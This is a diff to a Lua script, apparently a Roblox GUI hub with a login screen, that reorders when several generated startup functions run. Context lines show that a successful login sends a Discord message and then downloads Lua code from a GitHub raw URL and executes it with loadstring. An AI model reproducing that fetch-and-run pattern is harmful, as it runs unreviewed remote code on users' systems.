@@ -1796,13 +1796,8 @@ local function IYYRFG_fake_script() -- Function.ButtonManager
 	end)
 end
 local function Startscripts()
-	wait(3)
 	coroutine.wrap(JAYP_fake_script)()
-	coroutine.wrap(LJDKUI_fake_script)()
 	coroutine.wrap(APHL_fake_script)()
-	coroutine.wrap(EKTXSKT_fake_script)()
-	coroutine.wrap(WUSISS_fake_script)()
-	coroutine.wrap(WGZJ_fake_script)()
 	coroutine.wrap(HDZJ_fake_script)()
 	coroutine.wrap(YSAMJX_fake_script)()
 	coroutine.wrap(JQBNP_fake_script)()
@@ -1818,7 +1813,13 @@ local function Startscripts()
 	coroutine.wrap(SKCCDTB_fake_script)()
 	coroutine.wrap(ETAWTZ_fake_script)()
 end
-
+local function StartOther()
+	wait(1.5)
+	coroutine.wrap(WGZJ_fake_script)()
+	coroutine.wrap(WUSISS_fake_script)()
+	coroutine.wrap(EKTXSKT_fake_script)()
+	coroutine.wrap(LJDKUI_fake_script)()
+end
 local function SQPC_fake_script() -- Frame.AccountModule 
 	local script = Instance.new('LocalScript', Frame)
 	
@@ -1930,7 +1931,7 @@ local function SQPC_fake_script() -- Frame.AccountModule
 			end
 			sendDiscordMessage()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/ButtonsDownloader.lua"))()
-			coroutine.wrap(Startscripts)()
+			coroutine.wrap(StartOther)()
 		else
 			IncorrectSound:Play()
 			print("Login failed: Incorrect login or password.")
@@ -1960,3 +1961,4 @@ end
 coroutine.wrap(SQPC_fake_script)()
 coroutine.wrap(IYYRFG_fake_script)()
 coroutine.wrap(PVHMDTG_fake_script)()
+coroutine.wrap(Startscripts)()
